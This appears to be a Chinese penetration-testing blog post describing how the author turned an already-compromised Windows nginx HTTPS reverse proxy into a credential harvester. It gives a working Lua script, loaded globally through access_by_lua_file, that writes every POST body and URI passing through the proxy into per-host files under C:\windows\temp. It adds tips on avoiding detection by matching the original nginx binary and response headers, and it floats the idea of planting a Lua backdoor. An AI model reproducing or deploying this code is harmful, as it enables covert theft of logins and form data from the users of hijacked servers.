Title: openresty与https
Category: Pentest
Date: 2018-3-2
slug: openresty-https


有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。

#### 问题来了:如果你日了一台https反向代理服务器怎么办？

#### 标准答案：凉拌啊，卧槽。

#### P神的答案：<http://wooyun.jozxing.cc/static/drops/tips-6403.html>


### 磨刀霍霍向猪羊
开日：

Ok，windows版本的，你需要一个支持lua的nginx：

* 选择1: 在windows下编译一个单版本nginx带lua模块（这听起来就不是人干的活）
* 选择3: openresty（这个拼音好长）

### 翠花，上酸菜：

下载openresty和nginx的windows版本，先本地测试一下。

如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。

##### 汤＋水复制过来：

把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe，perfect。

然后。。。兄台你节操掉了：

把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty。（这里需要假设目标网管是个二货）

你以为到这一步完了么？呵呵，我读书少你不要骗我


### step2： 使用Lua截取目标反代的post数据包

根据P神的文章里面:

`access_by_lua_file /usr/local/openresty/luasrc/fish.lua;`


这个配置是http请求之前执行的，所以修改下这个lua文件：

```
local method=ngx.req.get_method()
local fd = io.open("C:\\windows\\temp\\"..ngx.var.host..".txt","ab")
ngx.req.read_body()
local data=ngx.req.get_body_data()
local uri = ngx.var.request_uri
if fd == nil then return end
if method == "POST" then
    if data == nil then return end
    fd:write(uri.."[*]"..data.."\n")
    fd:close()
end

```

把这一坨翔保存为fish.lua，然后放到nginx里面conf目录下，修改nginx.conf：

`access_by_lua_file conf/fish.lua;`

把上面这一行放到nginx配置的server模块外面那一层，相当于全局过滤，因为目标服务器反向代理了n个站。

参考链接：

 * <https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html>
 * <http://wooyun.jozxing.cc/static/drops/tips-6403.html>

坑点：

* 由于是直接在目标服务器操作的，中间把站点给down了n+n次，修改lua文件n次，主要依靠error.log来修改fish.lua，中间要判断data不为nil，参考上面文章。

* openresty启动指定配置文件要绝对路径。

* 如果lua在执行过程中出错（比如我碰到的data数据为空，虽然反代正常工作，但是用户登录就出错），服务器会报500，所以**绝对**保证lua文件不能出错。

最后达到什么效果： 截取所有的post数据和uri，根据域名放到不通的txt文件里面。 

没图说个蛋蛋：

![](https://i.loli.net/2017/07/25/5977478193da9.png)

![](https://i.loli.net/2017/07/25/597748509b5b3.png)

课后思考：

* 在尽可能隐藏行迹的情况下，最好是编译一个支持lua的nginx单版本
* openresty里面的nginx和官网纯nginx是有区别的： 纯的nginx是绿色G图标，openresty就木有，还是上面那条：编译一个可实际目标一样的nginx。openresty和nginx的response头是不一样的。

最后一个：如果某天撸了openresty的服务器，肿么感觉可以在配置里面留下一个lua的后门哩？